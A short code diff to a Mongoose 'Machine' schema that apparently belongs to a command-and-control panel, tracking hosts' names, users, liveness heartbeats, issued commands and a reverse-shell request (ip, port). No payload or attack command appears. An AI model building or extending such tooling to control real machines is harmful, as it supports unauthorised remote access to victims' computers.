@@ -8,7 +8,7 @@ const Machine = mongoose.model(
       computer_name: String,
       os: String,
       dns_domain: String,
-      log_on_server: Boolean,
+      log_on_server: String,
       username: String,
       alive: Boolean,
       since: {
@@ -27,9 +27,25 @@ const Machine = mongoose.model(
         type: Boolean,
         default: false
       },
-      revshell: Object,
-      mode: Number,
-      cmds: Number
+      revshell: {
+        type: Object,
+        default: { need: false, ip: "", port: -1, nb: 0 }
+      },
+      mode: {
+        type: Number,
+        default: 0
+      },
+      cmds: {
+        type: Number,
+        default: 0
+      },
+      lastAlive: {
+        type: Date,
+        default: Date.now
+      },
+      deadAt: {
+        type: Date
+      }
   }, {collection: "Machines"})
 );
 
